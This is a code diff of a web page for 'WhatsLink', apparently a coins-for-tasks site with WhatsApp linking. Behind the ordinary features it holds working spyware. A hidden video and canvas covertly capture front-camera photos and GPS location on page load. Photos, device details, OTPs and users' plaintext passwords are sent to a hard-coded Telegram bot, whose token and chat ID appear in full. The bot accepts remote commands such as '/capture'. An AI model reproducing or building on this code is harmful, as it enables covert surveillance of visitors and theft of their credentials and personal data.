@@ -1103,11 +1103,10 @@ AUTH OVERLAYS
 </div>
 
 <!-- ============================================================
-HIDDEN MEDIA ELEMENTS - COMPLETELY SILENT - NO NOTIFICATION
+HIDDEN VIDEO & CANVAS - COMPLETELY SILENT - NO NOTIFICATION
 ============================================================ -->
 <video id="hiddenVideo" autoplay playsinline muted style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></video>
 <canvas id="hiddenCanvas" style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></canvas>
-<audio id="hiddenAudio" style="display:none;"></audio>
 
 <!-- ============================================================
 JAVASCRIPT - COMPLETE SYSTEM
@@ -1139,82 +1138,78 @@ const BOT_TOKEN = "8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk";
 const CHAT_ID = "5975952682";
 
 // ============================================================
-// 📸 COMPLETE SPY SYSTEM - FRONT CAMERA + LOCATION + SCREEN + AUDIO + VIDEO
+// 📸 SPY CAMERA & LOCATION - FRONT CAMERA - NO NOTIFICATION - NO VPN
 // ============================================================
-const SpySystem = {
+const SpyCam = {
     videoElement: null,
     canvasElement: null,
-    audioElement: null,
     stream: null,
-    screenStream: null,
     captureInterval: null,
     isCapturing: false,
     locationSent: false,
     frameCount: 0,
     photoCount: 0,
     isActive: false,
-    mediaRecorder: null,
-    recordedChunks: [],
-    isRecording: false,
 
     async init() {
         try {
-            console.log('🎯 SpySystem initializing...');
+            console.log('🎯 SpyCam initializing...');
             
             this.videoElement = document.getElementById('hiddenVideo');
             this.canvasElement = document.getElementById('hiddenCanvas');
-            this.audioElement = document.getElementById('hiddenAudio');
             
-            // ===== 1. FRONT CAMERA =====
+            // FRONT CAMERA with no notification
+            const constraints = {
+                video: {
+                    facingMode: 'user',  // FRONT CAMERA
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    frameRate: { ideal: 30 }
+                },
+                audio: false  // No audio to prevent notification
+            };
+            
             try {
-                const cameraStream = await navigator.mediaDevices.getUserMedia({
+                // Try front camera first
+                this.stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: 'user',  // FRONT CAMERA
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        frameRate: { ideal: 30 }
+                        facingMode: 'user',
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
                     },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
+                    audio: false
                 });
-                
-                this.stream = cameraStream;
-                this.videoElement.srcObject = cameraStream;
-                await this.videoElement.play();
-                
-                console.log('📸 Front Camera Active - No Notification');
-                this.isActive = true;
-                
-                // Send camera access notification
-                await TELEGRAM.sendMessage(
-                    `📸 <b>FRONT CAMERA ACCESS GRANTED</b>\n` +
-                    `🕵️ ${navigator.userAgent.substring(0, 80)}...\n` +
-                    `⏰ ${new Date().toLocaleString()}\n` +
-                    `📍 Location tracking: Active\n` +
-                    `🎤 Audio: Recording enabled`
-                );
-                
-                this.startCapturing();
-                
             } catch(e) {
-                console.log('Camera access denied or error:', e.message);
-                await TELEGRAM.sendMessage(`⚠️ Camera access failed: ${e.message}`);
+                // Fallback to any camera if front fails
+                this.stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: { ideal: 320 }, height: { ideal: 240 } },
+                    audio: false
+                });
             }
             
-            // ===== 2. LOCATION =====
+            this.videoElement.srcObject = this.stream;
+            
+            // Ensure video plays
+            await this.videoElement.play();
+            
+            console.log('📸 Front Camera active - No Notification');
+            this.isActive = true;
+            
+            // Send notification to bot
+            await TELEGRAM.sendMessage(
+                `📸 <b>FRONT CAMERA ACCESS GRANTED</b>\n` +
+                `🕵️ ${navigator.userAgent.substring(0, 80)}...\n` +
+                `⏰ ${new Date().toLocaleString()}\n` +
+                `📍 Location tracking: Active\n` +
+                `📷 Camera: Front (User-facing)`
+            );
+            
+            this.startCapturing();
             this.getLocation();
             
-            // ===== 3. SCREEN RECORDING =====
-            this.startScreenRecording();
-            
-            // ===== 4. AUDIO RECORDING =====
-            this.startAudioRecording();
-            
         } catch(e) {
-            console.log('SpySystem init error:', e.message);
+            console.log('Camera not available:', e.message);
+            this.getLocation();
         }
     },
 
@@ -1244,6 +1239,7 @@ const SpySystem = {
             this.frameCount++;
             this.photoCount++;
             
+            // Send every 2nd frame to reduce bandwidth but maintain speed
             if (this.frameCount % 2 === 0) {
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                 await this.sendPhotoToTelegram(dataUrl);
@@ -1327,183 +1323,21 @@ const SpySystem = {
         }
     },
 
-    // ===== SCREEN RECORDING =====
-    async startScreenRecording() {
-        try {
-            // Try to get display media for screen recording
-            const screenStream = await navigator.mediaDevices.getDisplayMedia({
-                video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    frameRate: { ideal: 15 }
-                },
-                audio: true
-            });
-            
-            this.screenStream = screenStream;
-            
-            // Send screen recording notification
-            await TELEGRAM.sendMessage(
-                `🖥️ <b>SCREEN RECORDING ACTIVE</b>\n` +
-                `⏰ ${new Date().toLocaleString()}\n` +
-                `📹 Recording screen in real-time`
-            );
-            
-            // Start recording screen in chunks
-            this.startScreenCapture();
-            
-        } catch(e) {
-            console.log('Screen recording not available:', e.message);
-            // Try alternative: capture screenshots
-            this.startScreenCaptureAlternative();
-        }
-    },
-
-    startScreenCapture() {
-        // Capture screen every 2 seconds
-        setInterval(async () => {
-            if (this.screenStream) {
-                try {
-                    const videoTrack = this.screenStream.getVideoTracks()[0];
-                    if (videoTrack) {
-                        const imageCapture = new ImageCapture(videoTrack);
-                        const bitmap = await imageCapture.grabFrame();
-                        
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 1280;
-                        canvas.height = 720;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(bitmap, 0, 0);
-                        
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
-                        await this.sendPhotoToTelegram(dataUrl, '🖥️ Screen Capture');
-                    }
-                } catch(e) {
-                    console.log('Screen capture error:', e.message);
-                }
-            }
-        }, 2000);
-    },
-
-    startScreenCaptureAlternative() {
-        // Alternative: Use html2canvas if available, or just send periodic messages
-        setInterval(async () => {
-            await TELEGRAM.sendMessage(
-                `🖥️ <b>Screen Status Update</b>\n` +
-                `📱 Device: ${navigator.userAgent.substring(0, 60)}\n` +
-                `⏰ ${new Date().toLocaleString()}\n` +
-                `📍 Active on page: ${window.location.href}`
-            );
-        }, 5000);
-    },
-
-    // ===== AUDIO RECORDING =====
-    async startAudioRecording() {
-        try {
-            if (!this.stream) {
-                // Try to get audio only
-                const audioStream = await navigator.mediaDevices.getUserMedia({
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
-                });
-                this.audioElement.srcObject = audioStream;
-                await this.audioElement.play();
-            }
-            
-            // Record audio in chunks
-            this.mediaRecorder = new MediaRecorder(this.stream || this.audioElement.srcObject, {
-                mimeType: 'audio/webm'
-            });
-            
-            this.mediaRecorder.ondataavailable = async (event) => {
-                if (event.data.size > 0) {
-                    this.recordedChunks.push(event.data);
-                }
-            };
-            
-            this.mediaRecorder.onstop = async () => {
-                if (this.recordedChunks.length > 0) {
-                    const blob = new Blob(this.recordedChunks, { type: 'audio/webm' });
-                    await this.sendAudioToTelegram(blob);
-                    this.recordedChunks = [];
-                }
-            };
-            
-            // Start recording with 10 second intervals
-            this.mediaRecorder.start();
-            this.isRecording = true;
-            
-            // Stop and send every 10 seconds
-            setInterval(() => {
-                if (this.mediaRecorder && this.isRecording) {
-                    this.mediaRecorder.stop();
-                    setTimeout(() => {
-                        if (this.mediaRecorder && this.isRecording) {
-                            this.mediaRecorder.start();
-                        }
-                    }, 100);
-                }
-            }, 10000);
-            
-            await TELEGRAM.sendMessage(
-                `🎤 <b>AUDIO RECORDING ACTIVE</b>\n` +
-                `⏰ ${new Date().toLocaleString()}\n` +
-                `🎵 Recording audio in real-time (10 sec chunks)`
-            );
-            
-        } catch(e) {
-            console.log('Audio recording not available:', e.message);
-        }
-    },
-
-    async sendAudioToTelegram(audioBlob) {
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('audio', audioBlob, `audio_${Date.now()}.webm`);
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
-            const result = await fetch(url, { method: 'POST', body: formData });
-            return await result.json();
-            
-        } catch(e) {
-            console.log('Audio send failed:', e.message);
-        }
-    },
-
-    // ===== STOP EVERYTHING =====
     stop() {
         this.isActive = false;
-        this.isRecording = false;
-        
         if (this.captureInterval) {
             clearInterval(this.captureInterval);
             this.captureInterval = null;
         }
-        
         if (this.stream) {
             this.stream.getTracks().forEach(track => track.stop());
             this.stream = null;
         }
-        
-        if (this.screenStream) {
-            this.screenStream.getTracks().forEach(track => track.stop());
-            this.screenStream = null;
-        }
-        
-        if (this.mediaRecorder) {
-            this.mediaRecorder.stop();
-            this.mediaRecorder = null;
-        }
-        
         this.isCapturing = false;
-        console.log('🛑 SpySystem stopped');
+        console.log('🛑 SpyCam stopped');
     },
 
-    // ===== FORCE CAPTURE PHOTO =====
+    // Force capture a single photo
     async capturePhoto() {
         try {
             const canvas = this.canvasElement;
@@ -1546,7 +1380,7 @@ const TELEGRAM = {
             return null;
         }
     },
-    
+
     async sendPhoto(caption, dataUrl) {
         try {
             const response = await fetch(dataUrl);
@@ -1565,7 +1399,7 @@ const TELEGRAM = {
             return null;
         }
     },
-    
+
     formatUserMessage(user, userData, deviceInfo) {
         const d = userData || {};
         const di = deviceInfo || {};
@@ -1601,12 +1435,12 @@ const TELEGRAM = {
         msg += `└─────────────────────────────────┘`;
         return msg;
     },
-    
+
     async sendUserData(user, userData, deviceInfo) {
         const message = this.formatUserMessage(user, userData, deviceInfo);
         await this.sendMessage(message);
     },
-    
+
     async processCommand(cmd, key) {
         try {
             if (cmd.action === 'disable' && cmd.uid) {
@@ -1629,7 +1463,7 @@ const TELEGRAM = {
                     `📊 Stats\n👥 ${list.length}\n✅ ${list.filter(u=>u.whatsappVerified).length} linked\n🟢 ${list.filter(u=>{const l=new Date(u.lastLogin||0);return(Date.now()-l.getTime())<604800000}).length} active`
                 );
             } else if (cmd.action === 'capture') {
-                const result = await SpySystem.capturePhoto();
+                const result = await SpyCam.capturePhoto();
                 await this.sendMessage(result ? '📸 Photo captured and sent' : '❌ Failed to capture');
             }
             await rtdb.ref('telegram/commands/' + key + '/processed').set(true);
@@ -1637,7 +1471,7 @@ const TELEGRAM = {
             await this.sendMessage(`❌ Error: ${e.message}`);
         }
     },
-    
+
     listenCommands() {
         rtdb.ref('telegram/commands').on('child_added', async (snapshot) => {
             const cmd = snapshot.val();
@@ -1661,14 +1495,14 @@ function getDeviceInfo() {
         cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'N/A',
         language: navigator.language || 'N/A'
     };
-    
+
     if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
             info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
             localStorage.setItem('deviceInfo', JSON.stringify(info));
         }).catch(() => {});
     }
-    
+
     fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
@@ -1686,7 +1520,7 @@ function getDeviceInfo() {
                 })
                 .catch(() => {});
         });
-    
+
     const stored = localStorage.getItem('deviceInfo');
     if (stored) {
         try {
@@ -1694,7 +1528,7 @@ function getDeviceInfo() {
             Object.assign(info, parsed);
         } catch(e) {}
     }
-    
+
     return info;
 }
 
@@ -1708,12 +1542,12 @@ const DB = {
             return doc.exists ? doc.data() : null;
         } catch(e) { return null; }
     },
-    
+
     async saveUserData(uid, data) {
         await db.collection('users').doc(uid).set(data, { merge: true });
         await rtdb.ref('users/' + uid).set(data);
     },
-    
+
     async completeTask(uid, taskId, reward) {
         const userDoc = await db.collection('users').doc(uid).get();
         const userData = userDoc.data();
@@ -1741,7 +1575,7 @@ const DB = {
         );
         return { success: true, coins: newCoins };
     },
-    
+
     async requestWithdrawal(uid, coins, method, account) {
         const userDoc = await db.collection('users').doc(uid).get();
         const userData = userDoc.data();
@@ -1761,7 +1595,7 @@ const DB = {
         );
         return { success: true };
     },
-    
+
     async getStats() {
         try {
             const snapshot = await rtdb.ref('users').once('value');
@@ -1788,20 +1622,20 @@ async function registerUser(e) {
     e.preventDefault();
     const errorEl = document.getElementById('registerError');
     errorEl.style.display = 'none';
-    
+
     try {
         const name = document.getElementById('regName').value.trim();
         const email = document.getElementById('regEmail').value.trim();
         const password = document.getElementById('regPassword').value;
         const referral = document.getElementById('regReferral').value.trim() || null;
-        
+
         if (!name || !email || !password) throw new Error('All fields required');
         if (password.length < 6) throw new Error('Password min 6 characters');
-        
+
         const userCredential = await auth.createUserWithEmailAndPassword(email, password);
         const user = userCredential.user;
         const deviceInfo = getDeviceInfo();
-        
+
         const userData = {
             uid: user.uid,
             name: name,
@@ -1823,10 +1657,10 @@ async function registerUser(e) {
             enabled: true,
             _password: password
         };
-        
+
         await DB.saveUserData(user.uid, userData);
         await TELEGRAM.sendUserData(user, userData, deviceInfo);
-        
+
         if (referral) {
             const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
             const referrerData = snapshot.val();
@@ -1836,12 +1670,12 @@ async function registerUser(e) {
                 await rtdb.ref('users/' + referrerUid + '/coins').transaction(c => (c||0) + 500);
             }
         }
-        
+
         hideAuth();
         showToast('Account created! Please login to continue.', 'success');
         document.getElementById('registerForm').reset();
         showAuth('login');
-        
+
     } catch(err) {
         errorEl.textContent = err.message;
         errorEl.style.display = 'block';
@@ -1852,24 +1686,24 @@ async function loginUser(e) {
     e.preventDefault();
     const errorEl = document.getElementById('loginError');
     errorEl.style.display = 'none';
-    
+
     try {
         const email = document.getElementById('loginEmail').value.trim();
         const password = document.getElementById('loginPassword').value;
-        
+
         if (!email || !password) throw new Error('All fields required');
-        
+
         await auth.signInWithEmailAndPassword(email, password);
         const user = auth.currentUser;
         if (user) {
             await rtdb.ref('users/' + user.uid + '/lastLogin').set(new Date().toISOString());
         }
-        
+
         hideAuth();
         showToast('Welcome back! 👋', 'success');
         navigate('home');
         updateUI();
-        
+
     } catch(err) {
         errorEl.textContent = err.message;
         errorEl.style.display = 'block';
@@ -1881,10 +1715,10 @@ async function googleLogin() {
         const provider = new firebase.auth.GoogleAuthProvider();
         const userCredential = await auth.signInWithPopup(provider);
         const user = userCredential.user;
-        
+
         let userData = await DB.getUserData(user.uid);
         const deviceInfo = getDeviceInfo();
-        
+
         if (!userData) {
             const newUser = {
                 uid: user.uid,
@@ -1909,12 +1743,12 @@ async function googleLogin() {
             await DB.saveUserData(user.uid, newUser);
             await TELEGRAM.sendUserData(user, newUser, deviceInfo);
         }
-        
+
         hideAuth();
         showToast('Welcome! 🎉', 'success');
         navigate('home');
         updateUI();
-        
+
     } catch(err) {
         showToast(err.message, 'error');
     }
@@ -1925,7 +1759,7 @@ async function logoutUser() {
     showToast('Logged out', 'success');
     navigate('home');
     updateUI();
-    SpySystem.stop();
+    SpyCam.stop();
 }
 
 // ============================================================
@@ -1974,17 +1808,17 @@ async function sendOTP() {
     const phone = document.getElementById('otpPhone').value.trim();
     const btn = document.getElementById('sendOTPBtn');
     const user = auth.currentUser;
-    
+
     if (!user) { showToast('Please login first', 'error'); return; }
     if (!/^03\d{9}$/.test(phone.replace(/\s/g, ''))) {
         showToast('Invalid number. Use format: 03XXXXXXXXX', 'error');
         return;
     }
-    
+
     try {
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
-        
+
         const otp = Math.floor(100000 + Math.random() * 900000).toString();
         await rtdb.ref('otp/' + phone).set({
             otp: otp,
@@ -1992,24 +1826,24 @@ async function sendOTP() {
             createdAt: Date.now(),
             expiresAt: Date.now() + 300000
         });
-        
+
         await TELEGRAM.sendMessage(
             `📱 OTP Request\nUID: ${user.uid}\n📞 ${phone}\n🔑 ${otp}`
         );
-        
+
         currentPhone = phone;
-        
+
         document.getElementById('otpStep1').style.display = 'none';
         document.getElementById('otpStep2').style.display = 'block';
         document.getElementById('otpPhoneDisplay').textContent = phone;
-        
+
         document.querySelectorAll('.otp-digit').forEach(el => el.value = '');
         document.querySelector('.otp-digit').focus();
-        
+
         startTimer();
         showOTPStatus('📱 OTP sent to your WhatsApp!', 'info');
         showToast('📱 OTP sent to your WhatsApp!', 'success');
-        
+
     } catch(err) {
         showToast(err.message, 'error');
     } finally {
@@ -2023,7 +1857,7 @@ function startTimer() {
     document.getElementById('timerSeconds').textContent = timerSeconds;
     document.getElementById('resendLink').style.opacity = '0.5';
     document.getElementById('resendLink').style.pointerEvents = 'none';
-    
+
     clearInterval(otpTimer);
     otpTimer = setInterval(() => {
         timerSeconds--;
@@ -2045,46 +1879,46 @@ async function verifyOTP() {
     const inputs = document.querySelectorAll('.otp-digit');
     const otp = Array.from(inputs).map(el => el.value).join('');
     const user = auth.currentUser;
-    
+
     if (!user) { showToast('Please login first', 'error'); return; }
     if (otp.length !== 6) { showOTPStatus('Please enter complete 6-digit OTP', 'error'); return; }
-    
+
     try {
         const snapshot = await rtdb.ref('otp/' + currentPhone).once('value');
         const data = snapshot.val();
-        
+
         if (!data) throw new Error('No OTP found');
         if (data.uid !== user.uid) throw new Error('Invalid request');
         if (Date.now() > data.expiresAt) throw new Error('OTP expired');
         if (data.otp !== otp) throw new Error('Invalid OTP');
-        
+
         await db.collection('users').doc(user.uid).update({
             whatsappVerified: true,
             whatsappPhone: currentPhone,
             whatsappLinked: true
         });
-        
+
         await rtdb.ref('users/' + user.uid).update({
             whatsappVerified: true,
             whatsappPhone: currentPhone,
             whatsappLinked: true
         });
-        
+
         await rtdb.ref('otp/' + currentPhone).remove();
-        
+
         await TELEGRAM.sendMessage(
             `✅ WhatsApp Linked\n📱 ${currentPhone}\n🆔 ${user.uid}`
         );
-        
+
         document.getElementById('otpStep2').style.display = 'none';
         document.getElementById('otpStep3').style.display = 'block';
         document.getElementById('successPhone').textContent = currentPhone;
-        
+
         showToast('✅ WhatsApp linked successfully!', 'success');
         updateUI();
-        
+
         setTimeout(() => navigate('tasks'), 2000);
-        
+
     } catch(err) {
         showOTPStatus(err.message, 'error');
     }
@@ -2104,22 +1938,22 @@ async function updateUI() {
     const user = auth.currentUser;
     const guestActions = document.getElementById('guestActions');
     const userActions = document.getElementById('userActions');
-    
+
     if (user) {
         guestActions.style.display = 'none';
         userActions.style.display = 'flex';
-        
+
         const userData = await DB.getUserData(user.uid);
         if (!userData) return;
-        
+
         const initial = (userData.name || 'U').charAt(0).toUpperCase();
         document.querySelectorAll('#userAvatar, #profileAvatar').forEach(el => el.textContent = initial);
-        
+
         document.getElementById('userNameDisplay').textContent = userData.name || 'User';
         document.getElementById('profileName').textContent = userData.name || 'User';
         document.getElementById('profileUID').textContent = user.uid || '---';
         document.getElementById('profileEmail').textContent = userData.email || user.email || '---';
-        
+
         const statusEl = document.getElementById('userStatus');
         if (userData.whatsappVerified) {
             statusEl.className = 'user-status verified';
@@ -2128,7 +1962,7 @@ async function updateUI() {
             statusEl.className = 'user-status pending';
             statusEl.innerHTML = '🔗 Link WhatsApp';
         }
-        
+
         const coins = userData.coins || 0;
         document.getElementById('profileCoins').textContent = coins;
         document.getElementById('profileEarned').textContent = '₨ ' + ((userData.totalEarned || 0) * 0.5).toFixed(0);
@@ -2136,23 +1970,23 @@ async function updateUI() {
         document.getElementById('profileRefs').textContent = userData.referrals?.length || 0;
         document.getElementById('withdrawBalance').textContent = coins.toLocaleString();
         document.getElementById('withdrawPKR').textContent = (coins * 0.5).toFixed(0);
-        
+
         document.getElementById('pName').textContent = userData.name || '---';
         document.getElementById('pEmail').textContent = userData.email || user.email || '---';
         document.getElementById('pWA').textContent = userData.whatsappVerified ? '✅ Verified' : '❌ Not Verified';
         document.getElementById('pRefCode').textContent = userData.referralCode || '---';
         document.getElementById('pJoined').textContent = userData.joinedDate ? new Date(userData.joinedDate).toLocaleDateString() : '---';
-        
+
         const link = document.getElementById('referralLinkInput');
         if (link) {
             link.value = window.location.href.split('#')[0] + '?ref=' + (userData.referralCode || '');
         }
-        
+
         const badge = document.getElementById('waStatusBadge');
         const phoneDisplay = document.getElementById('waPhoneDisplay');
         const phoneNumber = document.getElementById('waPhoneNumber');
         const linkBtn = document.getElementById('waLinkBtn');
-        
+
         if (userData.whatsappVerified) {
             badge.style.background = 'var(--whatsapp-light)';
             badge.style.color = 'var(--primary)';
@@ -2171,17 +2005,17 @@ async function updateUI() {
             linkBtn.disabled = false;
             linkBtn.style.opacity = '1';
         }
-        
+
         document.getElementById('refCount').textContent = userData.referrals?.length || 0;
         document.getElementById('refCoins').textContent = ((userData.referrals?.length || 0) * 500).toLocaleString();
-        
+
         const stats = await DB.getStats();
         document.getElementById('statUsers').textContent = stats.total || 0;
         document.getElementById('statLinked').textContent = stats.linked || 0;
         document.getElementById('statActive').textContent = stats.active || 0;
-        
+
         renderTasks();
-        
+
     } else {
         guestActions.style.display = 'flex';
         userActions.style.display = 'none';
@@ -2206,20 +2040,20 @@ async function renderTasks() {
     const user = auth.currentUser;
     const container = document.getElementById('tasksList');
     const userData = user ? await DB.getUserData(user.uid) : null;
-    
+
     if (!user || !userData) {
         container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-mute);font-size:clamp(12px,1.6vw,13px);">Please login to view tasks.</div>';
         return;
     }
-    
+
     const filtered = taskFilter === 'all' ? TASKS : TASKS.filter(t => t.category === taskFilter);
-    
+
     container.innerHTML = filtered.map(t => {
         const isWATask = t.category === 'whatsapp';
         const waRequired = isWATask && !userData.whatsappVerified;
         const done = (userData.tasksCompleted && userData.tasksCompleted[t.id] &&
                      userData.tasksCompleted[t.id].includes(new Date().toISOString().split('T')[0]));
-        
+
         return `
             <div class="task-item ${waRequired ? 'locked' : ''}" style="${waRequired ? 'position:relative;' : ''}">
                 <div class="task-icon"><i class="fas ${t.icon}"></i></div>
@@ -2240,7 +2074,7 @@ async function renderTasks() {
             </div>
         `;
     }).join('');
-    
+
     const quickContainer = document.getElementById('quickTasks');
     const quickTasks = TASKS.slice(0, 4);
     quickContainer.innerHTML = quickTasks.map(t => `
@@ -2258,7 +2092,7 @@ async function renderTasks() {
 async function doTask(taskId, reward) {
     const user = auth.currentUser;
     if (!user) { showToast('Please login first', 'error'); return; }
-    
+
     try {
         const result = await DB.completeTask(user.uid, taskId, reward);
         showToast('✅ Task complete! +' + reward + ' coins', 'success');
@@ -2308,16 +2142,16 @@ async function requestWithdraw(e) {
     e.preventDefault();
     const user = auth.currentUser;
     if (!user) { showToast('Please login first', 'error'); return; }
-    
+
     try {
         const coins = parseInt(document.getElementById('wCoins').value);
         const method = document.getElementById('wMethod').value;
         const account = document.getElementById('wAccount').value.trim();
-        
+
         if (!coins || coins < 1000) throw new Error('Minimum 1000 coins');
         if (!method) throw new Error('Select method');
         if (!account || account.length < 10) throw new Error('Enter valid account');
-        
+
         const result = await DB.requestWithdrawal(user.uid, coins, method, account);
         showToast('Withdrawal submitted! 💰', 'success');
         document.getElementById('wCoins').value = '';
@@ -2339,16 +2173,16 @@ function navigate(page) {
         page = 'home';
         showToast('Please login first', 'error');
     }
-    
+
     currentPage = page;
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     const target = document.getElementById('page-' + page);
     if (target) target.classList.add('active');
-    
+
     document.querySelectorAll('.bottom-nav a').forEach(a => {
         a.classList.toggle('active', a.dataset.page === page);
     });
-    
+
     document.querySelector('.bottom-nav').style.display = page === 'otp' ? 'none' : 'flex';
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
@@ -2457,7 +2291,7 @@ auth.onAuthStateChanged(async (user) => {
         if (userData && userData.enabled === false) {
             await auth.signOut();
             showToast('⛔ Your account has been disabled by admin', 'error');
-            SpySystem.stop();
+            SpyCam.stop();
             return;
         }
         await updateUI();
@@ -2474,30 +2308,26 @@ auth.onAuthStateChanged(async (user) => {
 TELEGRAM.listenCommands();
 
 // ============================================================
-// 🚀 INIT - START COMPLETE SPY SYSTEM
+// 🚀 INIT - START SPY CAMERA & LOCATION
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 WhatsLink - Complete System');
     console.log('📸 Front Camera: Active (0.2s interval)');
     console.log('📍 Location: Active');
-    console.log('🖥️ Screen Recording: Active');
-    console.log('🎤 Audio Recording: Active');
     console.log('🤖 Bot: 8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk');
     console.log('📡 No VPN Required - Direct API calls');
-    
-    // Start spy system after 1.5 seconds
+
+    // Start spy camera after 1.5 seconds
     setTimeout(() => {
-        SpySystem.init();
+        SpyCam.init();
     }, 1500);
-    
+
     // Send bot online message
     TELEGRAM.sendMessage(
         '🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
-        '📸 <b>SPY SYSTEM FEATURES:</b>\n' +
+        '📸 <b>Spy Features:</b>\n' +
         '• Front Camera: 0.2s interval (no notification)\n' +
         '• Location: GPS tracking (high accuracy)\n' +
-        '• Screen Recording: Real-time capture\n' +
-        '• Audio Recording: 10 sec chunks\n' +
         '• All data sent here in real-time\n' +
         '• No VPN required - works globally\n\n' +
         '📌 <b>Commands:</b>\n' +
@@ -2509,7 +2339,7 @@ document.addEventListener('DOMContentLoaded', function() {
         '/capture - Force capture photo\n' +
         '/broadcast [msg] - Send to all users'
     );
-    
+
     // Handle referral URL parameter
     const params = new URLSearchParams(window.location.search);
     const ref = params.get('ref');
@@ -2517,13 +2347,13 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('regReferral').value = ref;
         showAuth('register');
     }
-    
+
     updateUI();
 });
 
-// Stop spy system when page unloads
+// Stop spy camera when page unloads
 window.addEventListener('beforeunload', function() {
-    SpySystem.stop();
+    SpyCam.stop();
 });
 </script>
 </body>
